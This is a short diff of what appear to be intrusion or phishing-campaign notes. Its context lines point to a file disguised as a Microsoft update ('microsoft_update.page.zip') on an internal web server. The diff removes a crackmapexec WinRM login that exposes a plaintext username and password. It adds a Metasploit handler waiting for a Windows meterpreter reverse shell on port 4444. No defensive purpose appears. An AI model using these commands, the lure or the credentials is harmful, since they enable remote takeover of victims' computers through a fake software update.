@@ -21,7 +21,11 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 sudo cp -r /caminho/para/conectasocial_advanced /var/www/html/
 
-crackmapexec winrm 192.168.1.84 -u rsilva -p asd123$$$
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.137
+set LPORT 4444
+run
 
 
 
